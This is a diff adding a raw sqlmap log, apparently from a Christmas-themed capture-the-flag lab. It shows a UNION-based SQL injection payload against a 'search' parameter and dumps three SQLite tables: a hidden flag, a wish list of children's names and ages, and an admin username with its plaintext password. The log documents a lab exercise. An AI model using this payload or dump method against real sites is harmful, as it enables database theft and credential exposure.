@@ -1,0 +1,64 @@
+sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: search=candy' UNION ALL SELECT NULL,'qkjvq'||'ymVQHCfmEXaZRfercKszdLoZZdisAFTwnjpezrkb'||'qjxxq'-- iqhd
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: search=candy' UNION ALL SELECT NULL,'qkjvq'||'ymVQHCfmEXaZRfercKszdLoZZdisAFTwnjpezrkb'||'qjxxq'-- iqhd
+---
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+Table: hidden_table
+[1 entry]
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| thmfox{All_I_Want_for_Christmas_Is_You} |
++-----------------------------------------+
+
+Database: SQLite_masterdb
+Table: sequels
+[22 entries]
++-------------+-----+----------------------------+
+| kid         | age | title                      |
++-------------+-----+----------------------------+
+| James       | 8   | shoes                      |
+| John        | 4   | skateboard                 |
+| Robert      | 17  | iphone                     |
+| Michael     | 5   | playstation                |
+| William     | 6   | xbox                       |
+| David       | 6   | candy                      |
+| Richard     | 9   | books                      |
+| Joseph      | 7   | socks                      |
+| Thomas      | 10  | 10 McDonalds meals         |
+| Charles     | 3   | toy car                    |
+| Christopher | 8   | air hockey table           |
+| Daniel      | 12  | lego star wars             |
+| Matthew     | 15  | bike                       |
+| Anthony     | 3   | table tennis               |
+| Donald      | 4   | fazer chocolate            |
+| Mark        | 17  | wii                        |
+| Paul        | 9   | github ownership           |
+| James       | 8   | finnish-english dictionary |
+| Steven      | 11  | laptop                     |
+| Andrew      | 16  | rasberry pie               |
+| Kenneth     | 19  | TryHackMe Sub              |
+| Joshua      | 12  | chair                      |
++-------------+-----+----------------------------+
+
+Database: SQLite_masterdb
+Table: users
+[1 entry]
++------------------+----------+
+| password         | username |
++------------------+----------+
+| EhCNSWzzFP6sc7gB | admin    |
++------------------+----------+
+
